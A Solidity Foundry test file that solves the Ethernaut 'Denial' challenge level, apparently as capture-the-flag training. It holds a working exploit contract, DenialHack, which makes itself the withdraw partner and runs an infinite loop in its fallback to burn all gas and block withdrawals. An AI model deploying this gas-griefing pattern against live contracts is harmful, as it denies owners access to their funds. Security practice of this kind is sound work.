// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Denial/DenialFactory.sol";
import "../src/Ethernaut.sol";

contract DenialTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testDenialHack() public {
        /****************
         * Factory setup *
         *************** */
        DenialFactory denialFactory = new DenialFactory();
        ethernaut.registerLevel(denialFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance{
            value: 0.001 ether
        }(denialFactory);
        Denial ethernautDenial = Denial(payable(levelAddress));
        /****************
         *    Attack     *
         *************** */
        /*
         * The goal of this level is to become a withdraw partner and drain all gas of the transactions
         * The idea is to create a Hack contract, and set it as a "withdraw partner"
         * Once the withdraw function is done, will go through a inifite loop in the fallback with:
         *  while (true) {} and basically drain all the gas
         */
        ethernautDenial.setWithdrawPartner(player);
        // just creating the instance is enough to solve the level
        new DenialHack(levelAddress);
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract DenialHack {
    Denial challenge;

    constructor(address _victim) {
        challenge = Denial(payable(_victim));
        challenge.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        // will loop through until out of gas
        while (true) {}
    }
}
